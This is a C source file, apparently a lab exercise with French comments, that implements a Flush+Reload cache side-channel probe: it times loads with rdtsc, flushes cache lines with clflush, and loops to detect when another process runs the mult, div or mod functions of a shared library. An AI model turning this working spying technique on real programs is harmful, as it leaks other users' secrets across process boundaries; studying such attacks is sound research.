#define THRESHOLD 50
#include <stdio.h>
#include <unistd.h>
#include "bib.h"

#define _GNU_SOURCE

int probe(char * adrs){
    volatile unsigned long time;

    asm __volatile__(
        "mfence \n" // 
        "lfence \n" // Evite la parallelisation d'instruction (assure la sequentialité)
        "rdtsc \n"  // enregistre le tmeps
        "lfence \n"
        "movl %%eax, %%esi \n" // on met la mesure de temps dans esi
        "movl (%1), %%eax\n" // on prend l'adresse de adrs, on load (cache ou pas cache ???)
        "lfence \n"
        "rdtsc \n" // 2e mesure de temps
        "subl %%esi, %%eax \n" // on soustrait pour avoir le delta t
        "clflush 0(%1) \n" // on flush 
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");

    printf("time : %ld\n", time);

    return time < THRESHOLD;
}

int probemul(char * adrs){
    volatile unsigned long time;

    asm __volatile__(
        "mfence \n" // 
        "lfence \n" // Evite la parallelisation d'instruction (assure la sequentialité)
        "rdtsc \n"  // enregistre le tmeps
        "lfence \n"
        "movl %%eax, %%esi \n" // on met la mesure de temps dans esi
        "movl (%1), %%eax\n" // on prend l'adresse de adrs, on load (cache ou pas cache ???)
        "lfence \n"
        "rdtsc \n" // 2e mesure de temps
        "subl %%esi, %%eax \n" // on soustrait pour avoir le delta t
        "clflush 0(%1) \n" // on flush 
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");

    printf("time : %ld\n", time);

    return time < THRESHOLD;
}

int probediv(char * adrs){
    volatile unsigned long time;

    asm __volatile__(
        "mfence \n" // 
        "lfence \n" // Evite la parallelisation d'instruction (assure la sequentialité)
        "rdtsc \n"  // enregistre le tmeps
        "lfence \n"
        "movl %%eax, %%esi \n" // on met la mesure de temps dans esi
        "movl (%1), %%eax\n" // on prend l'adresse de adrs, on load (cache ou pas cache ???)
        "lfence \n"
        "rdtsc \n" // 2e mesure de temps
        "subl %%esi, %%eax \n" // on soustrait pour avoir le delta t
        "clflush 0(%1) \n" // on flush 
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");

    printf("time : %ld\n", time);

    return time < THRESHOLD;
}

int probemod(char * adrs){
    volatile unsigned long time;

    asm __volatile__(
        "mfence \n" // 
        "lfence \n" // Evite la parallelisation d'instruction (assure la sequentialité)
        "rdtsc \n"  // enregistre le tmeps
        "lfence \n"
        "movl %%eax, %%esi \n" // on met la mesure de temps dans esi
        "movl (%1), %%eax\n" // on prend l'adresse de adrs, on load (cache ou pas cache ???)
        "lfence \n"
        "rdtsc \n" // 2e mesure de temps
        "subl %%esi, %%eax \n" // on soustrait pour avoir le delta t
        "clflush 0(%1) \n" // on flush 
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");

    printf("time : %ld\n", time);

    return time < THRESHOLD;
}


int main(void){
    probemul((char *)mult);
    probediv((char *)div);
    probemod((char *)mod);
    while(1){
        if (probemul((char *)mult)){
            printf("mult used\n");
        }
        if (probemod((char *)mod)){
            printf("mod used\n");
        }
        if (probediv((char *)div)){
            printf("div used\n");
        }
        usleep(1000000);
    }
    // probe((char *)mult);
    // while (!probe((char *)mod));
    // printf("flush & reload worked\n");

}